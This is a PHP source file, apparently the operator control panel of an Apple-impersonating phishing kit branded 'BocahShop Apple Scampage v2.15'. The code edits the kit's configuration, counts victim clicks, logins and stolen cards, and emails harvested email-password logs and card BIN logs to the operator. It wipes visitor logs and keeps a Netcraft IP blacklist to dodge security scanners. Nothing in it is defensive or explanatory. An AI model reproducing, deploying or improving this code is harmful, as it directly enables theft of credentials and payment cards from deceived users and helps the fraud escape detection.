<?php

# C0d3d by Agung Satrio
# Apple Scampage v2.15

error_reporting(0);
@require_once "tytyd.php";

if(@$_GET["key"] != $key)
    {
           exit('<script>alert("MaU NiKuNg YeAA :v~\n\n[B]OCA[H]SHO[P]")</script><meta http-equiv="refresh" content="0; url=/"/>');
    }
?>
<html>
    <head>
        <title>Multi Tools</title>
        <style type="text/css">
            #body {
                margin: auto;
                padding: 10px;
                text-align: center;
            }
            #bukak {
                float: left;
                padding: 1px;
                letter-spacing:
                 0.5px;
            }
            #masa {
                float: right;
                padding: 1px;
                letter-spacing:
                 0.5px;
            }
            .box {
                margin: auto;
                box-shadow: 1px 1px 3px 1px grey;
                width: 50%;
                border-radius: 10px;
                background: rgb(249, 247, 247);
            }
            .judul {
                padding: 7px;
                background: grey;
                border-radius: 10px 10px 0 0;
                border: none;
                margin-bottom: 9px;
                color: white;
                font-family: sans-serif;
                font-weight: bold;
                letter-spacing: 1px;
                word-spacing: 3px;
            }
            input[type=text] {
                padding: 3px 5px;
                margin-right: 3%;
            }
            input[type=submit],input[type=reset] {
                width: 27%;
                border-radius: 5px;
                background: #f0f0f0;
                padding: 3px;
            }
            .jarak {
                margin-bottom: 11px;
            }
            #total {
                text-align: center;
            }
            .klik,.alat {
                text-align: center;
                padding: 5px 11px;
                background: #d8d6d6;
                font-weight: bold;
                font-family: sans-serif;
                letter-spacing: 1px;
                word-spacing: 1px;
                font-size: 13px;
                color: #656464;
                margin: 0px 5px 10px;
                display: inline;
                border-radius: 5px;
            }
            .alat {
                background: none;
                margin: -5px;
            }
        </style> 
    </head>
    <body bgcolor="#f0f0f0">
        <div id="bukak">
            <a style="text-decoration:none; background-color: #0070c9; background: linear-gradient(#42a1ec, #0070c9); color: white; border-radius: 5px; padding: 3px 7px;" href="https://<?php echo $_SERVER['SERVER_NAME']."/".$param;?>" target="_blank">OpenScam</a>
        </div>
        <div id="masa" style="text-decoration:none;background-color: #f7da1f;background: linear-gradient(#ecc542, #c9c300);color: white;border-radius: 5px;padding: 3px 7px;">
            Aktif <font color="green"><?php 
            $umur = ((strtotime(date("d-m-Y")) - strtotime($dimulai)) / (24*60*60) == 0) ? "Menuju <b><font color=blue>1</font></b> Hari" : "<b><font color=blue>".(strtotime(date("d-m-Y")) - strtotime($dimulai)) / (24*60*60)." </font></b>Hari Lebih";
            $umurlog = ((strtotime(date("d-m-Y")) - strtotime($dimulai)) / (24*60*60) == 0) ? 1 : (strtotime(date("d-m-Y")) - strtotime($dimulai)) / (24*60*60);
            echo $umur ?></font>
        </div>
         <div id="body">
            <div class="box">
                <div class="judul">Email Changer</div>
                    <form method="POST">
                        Email Lama  : <input type="text" size="27" name="lama" value="<?php echo $Your_Email; ?>" required=required></input>
                        <p>
                        Email Baru  : <input type="text" size="27" name="baru" value"" placeholder="emailmu@host.tld" required=required></input>
                        <p>
                        <input type="submit" class="jarak" name="email" value="ganti email result"></input>
                        <input type="reset" class="jarak" value="reset kotak"></input>
                    </form>
                </div>

            <div class="box">
                <div class="judul">Settings</div>
                    <form method="POST">
                       Lama : <input type="text" size="3" name="modlama" value="1" disabled="disabled"></input>
                         Baru : <input type="text" size="3" name="modbaru" maxlength="1" placeholder="0,1,2" value="" disabled="disabled"></input>
                         <input type="submit" name="mode" value="ganti mode login" disabled="disabled"></input>
                         </p>
                    [ <font color="red"><s>0=False</s></font> ] [ <font color="blue">1=True_Data</font> ] [ <s><font color="green">2=Grab_Data</font></s> ]
                    </form>
                    <form method="POST">
                       Elang : <input type="text" size="7" name="emla" value="<?php echo $elang; ?>" required="required"></input>
                        <input type="text" size="7" name="emba" placeholder="8,9,10..." value="" maxlength="2" required=required></input>
                         <input type="submit" name="elang" value="ganti elang"></input>
                    </form>
                    <form method="POST">
                       Plang : <input type="text" size="7" name="pasla" value="<?php echo $plang; ?>" required="required"></input>
                        <input type="text" size="7" name="pasba" placeholder="6,7,8..." value="" maxlength="1" required=required></input>
                         <input type="submit" name="plang" value="ganti plang"></input>
                    </form>
                    <form method="POST">
                       Key : <input type="text" size="8" name="keylama" value="<?php echo $key; ?>" required="required"></input>
                        <input type="text" size="8" name="keybaru" maxlength="8" placeholder="key_baru" value="" required=required></input>
                         <input type="submit" name="key" value="ganti key"></input>
                    </form>
                    <form method="POST">
                       Resess : <input type="text" size="7" name="rela" value="<?php echo $reloads; ?>" required="required"></input>
                        <input type="text" size="7" name="reba" id="reload" maxlength="1" placeholder="2,3,4...." value="" required=required></input>
                         <input type="submit" name="reload" value="ganti resess"></input>
                    </form>
                    <form method="POST">
                       Fired : <input type="text" size="7" name="parla" value="<?php echo $param; ?>" required="required"></input>
                        <input type="text" size="7" name="parba" maxlength="2" placeholder="nama_baru" class="jarak" value="" required=required></input>
                         <input type="submit" name="param" class="jarak" value="ganti fired"></input>
                         <p/>
                    </form>
                    <form method="POST">
                       Remod : <input type="text" size="7" name="resla" value="<?php echo $res; ?>" required="required"></input>
                        <input type="text" size="7" name="resba" id="resba" maxlength="1" placeholder="c atau d" class="jarak" value="" required=required></input>
                         <input type="submit" name="result" class="jarak" value="ganti remod"></input>
                         <p/>
                    </form>
                    <form method="POST">
                       Devia : <input type="text" size="7" name="devla" value="<?php echo $devia; ?>" required="required"></input>
                        <input type="text" size="7" name="devba" maxlength="1" placeholder="a atau p" class="jarak" value="" required=required></input>
                         <input type="submit" name="device" class="jarak" value="ganti devia"></input>
                         <p/>
                    </form>
            </div>

            <div id="total">
                <form method="POST">
                    <div class="alat"><button name="rd">reset data</button></div>
                    <div class="alat"><button name="sd">send data</button></div>
                    <div class="klik">click : <font color="red"><?php echo empty(@file_get_contents("bocah/logs/._hitz_.txt")) ? "0" : @file_get_contents("bocah/logs/._hitz_.txt"); ?></font></div>
                    <div class="klik">login : <font color="blue"><?php echo empty(@file_get_contents("bocah/logs/._loginz_.txt")) ? "0" : @file_get_contents("bocah/logs/._loginz_.txt"); ?></font></div>
                    <div class="klik">ccs : <font color="green"><?php echo empty(@file_get_contents("bocah/logs/._ccz_.txt")) ? "0" : @file_get_contents("bocah/logs/._ccz_.txt"); ?></font></div>
                    <div class="alat"><button name="sl">send logs</button></div>
                    <div class="alat"><button name="sb">sen bins</button></div>
                </form>
            </div>
        </div>
        
<?php
   @unlink("set.php");
   
    $lama   = trim(@$_POST['lama']);
    $baru   = trim(@$_POST['baru']);
    $modla = trim(@$_POST['modlama']);
    $modba = trim(@$_POST['modbaru']);
    $emla = trim(@$_POST['emla']);
    $emba = trim(@$_POST['emba']);
    $pasla = trim(@$_POST['pasla']);
    $pasba = trim(@$_POST['pasba']);
    $keylama = trim(@$_POST['keylama']);
    $keybaru = trim(@$_POST['keybaru']);
    $rela = trim(@$_POST['rela']);
    $reba = trim(@$_POST['reba']);
    $resla = trim(@$_POST['resla']);
    $resba = trim(strtolower(@$_POST['resba']));
    $devla = trim(@$_POST['devla']);
    $devba = trim(strtolower(@$_POST['devba']));
    $parla = trim(@$_POST['parla']);
    $parba = trim(@$_POST['parba']);
    $file   = "tytyd.php";
    $isi    = @file_get_contents($file);

if(isset($_POST['email'])) {
    if(@preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['mode'])) {
    if(@preg_match("#True_Login = $modla#is", $isi)) {
        $isi = str_replace("$modla; // True Login Mode","$modba; // True Login Mode",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_mode'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['elang'])) {
    if(@preg_match("#elang = $emla#is", $isi)) {
        $isi = str_replace("$emla; // MinLength Email","$emba; // MinLength Email",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email_length'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['plang'])) {
    if(@preg_match("#plang = $pasla#is", $isi)) {
        $isi = str_replace("$pasla; // MinLength Pass","$pasba; // MinLength Pass",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_pass_length'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['key'])) {
   if(@preg_match("#\b$keylama\b#is", $isi)) {
        $isi = str_replace($keylama,$keybaru,$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/bs/$keybaru#ganti_key'/>";
    }
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['reload'])) {
    if(@preg_match("#reloads = $rela#is", $isi)) {
        $isi = str_replace("$rela; // tot reload","$reba; // tot reload",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_total_reload'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['param'])) {
    if(@preg_match("#param = \"$parla\"#is", $isi)) {
        $isi = str_replace("$parla\"; // Parameter Redirect","$parba\"; // Parameter Redirect",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        @rename($parla.".php",$parba.".php");
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_parameter'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['result'])) {
    if(@preg_match("#res = \"$resla#is", $isi)) {
        $isi = str_replace("$resla\"; // Mode Result","$resba\"; // Mode Result",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_pass_length'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['device'])) {
    if(@preg_match("#devia = \"$devla#is", $isi)) {
        $isi = str_replace("$devla\"; // Device Access","$devba\"; // Device Access",$isi);
        $buka = @fopen($file,'w');
        @fwrite($buka,$isi);
        fclose($buka);
        
        echo "<script>alert('sukses~')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_device_access'/>";
    }    
    else
         echo "<script>alert('gagal!~')</script>";
}
else if(isset($_POST['rd'])) {
       @unlink("._no_.txt");
       @unlink("._nob_.txt");
       @unlink("bocah/logs/._hitz_.txt");
       @unlink("bocah/logs/._loginz_.txt");
       @unlink("bocah/logs/._ccz_.txt");
       @unlink("._logz_.txt");
       @unlink("bocah/logs/bxp.log");
       @unlink("bocah/logs/bin.log");
       @unlink("error_log");
       @unlink("._ssid.txt");
       // @unlink("bocah/includes/blacklist.dat");
       @unlink("bocah/logs/accepted_visitors.txt");
       @unlink("bocah/logs/ip2_log.txt");
       @unlink("bocah/logs/denied_visitors.txt");
       @unlink("bocah/logs/visitor_logged_in.txt");
       
       $filee = @file_get_contents("bocah/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = @fopen("bocah/includes/blacklist.dat",'w');
       @fwrite($buka,$cek[0][0]."\r\r");
       @fclose($buka);
       
       echo "<script>alert('sukses~')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
else if(isset($_POST['sd'])) {
    $empass          = @file_get_contents("bocah/logs/bxp.log");
    $total          = substr_count($empass,"@");
    
    if($total <= 0)
        {
            echo '<script>alert("gagal~\n\nempas kosong :P")</script>';
        }
    else
        {
            $fil = "._no_.txt";
            $last = (@file_get_contents($fil) == "" ? "1" : @file_get_contents($fil));
            $urut = fopen($fil,"w");
            fwrite($urut,$last+1);
            fclose($urut);
            
            $headers          = "From: Empas Apel <empas.apel@bocah.team>\r\n";
            $headers         .= "Reply-to: apel@bocah.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Empas #$last ] [ Total $total Lines ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $data            = "++--------------[$] [B]OCA[H]SHO[P] [$]--------------++

  -----------------------------------------------------------------
$empass
  -----------------------------------------------------------------";
            
            @mail($to, $subj, $data, $headers);
            
            echo "<script>alert('sukses~')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_empas'/>";
        }
}
else if(isset($_POST['sb'])) {
    $binbin          = @file_get_contents("bocah/logs/bin.log");
    $total          = substr_count($binbin,"[");
    
    if($total <= 0)
        {
            echo '<script>alert("gagal~\n\nbin kosong :P")</script>';
        }
    else
        {
            $fil = "._nob_.txt";
            $last = (@file_get_contents($fil) == "" ? "1" : @file_get_contents($fil));
            $urut = fopen($fil,"w");
            fwrite($urut,$last+1);
            fclose($urut);
            
            $headers          = "From: Bin Colletions <bin.cece@bocah.team>\r\n";
            $headers         .= "Reply-to: apel@bocah.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Bin #$last ] [ Total $total Cards ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $data            = "++--------------[$] [B]OCA[H]SHO[P] [$]--------------++

  -----------------------------------------------------------------
$binbin
  -----------------------------------------------------------------";
            
            @mail($to, $subj, $data, $headers);
            
            echo "<script>alert('sukses~')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_bin'/>";
        }
}
else if(isset($_POST['sl'])) {
            $fil2 = "._logz_.txt";
            $lasts = (@file_get_contents($fil2) == "" ? "1" : @file_get_contents($fil2));
            $urut = fopen($fil2,"w");
            fwrite($urut,$lasts+1);
            fclose($urut);
            
            $headers          = "From: BocahScam Report <report.apel@bocah.team>\r\n";
            $headers         .= "Reply-to: apel@bocah.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $subj            = "[ Report #$lasts ] [ BocahShop Apple V2.15 ] [ ".date("D, d-F-y H:i")." ]";
            $to              = $Your_Email;
            $tor = $tglorder;
            $tcl = (@file_get_contents("bocah/logs/._hitz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._hitz_.txt"));
            $tlo = (@file_get_contents("bocah/logs/._loginz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._loginz_.txt"));
            $tcc = (@file_get_contents("bocah/logs/._ccz_.txt") == "" ? "0" : @file_get_contents("bocah/logs/._ccz_.txt"));
            $tlh = substr_count(@file_get_contents("._ssid.txt")," ");
            $det = array("u" => $_SERVER['SERVER_NAME'],"p" => $_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"],"m" => $umurlog,"tc" => $tcl,"tl" => $tlo,"tcc" => $tcc,"lh" => $tlh);
            $data            = "
++------------------[$] [B]OCA[H]SHO[P] [$]------------------++

  ------------------------------------------------------------------------
# Domen Scam     :   ".$det['u']."
# Panel Scam       :   ".$det['p']."
# Umur Scam        :   ".$det['m']." hari
# Tanggal Order    :   ".$tor."
# Total Load          :   ".$det['lh']."
# Total Klik            :   ".$det['tc']."
# Total Login         :   ".$det['tl']."
# Total Card          :   ".$det['tcc']."
  ------------------------------------------------------------------------";
            
            @mail($to, $subj, $data, $headers);
            
            echo "<script>alert('sukses~')</script>";
            echo "<meta http-equiv='refresh' content='0; url=#send_report'/>";
}
?>
        <footer style="position: fixed;bottom: 7px;left: 0px;right: 0px;text-align: center;letter-spacing: 1px;color: black;">~ $ <a style="text-decoration: none;" href="http://fb.me/admin.bocah" target="_blank"><font color="red">AppleScam</font> [B]oca[H]sho[P]</b></font> <font color="green">v2.15-up1</font></a> $ ~</footer>
    </body>
</html>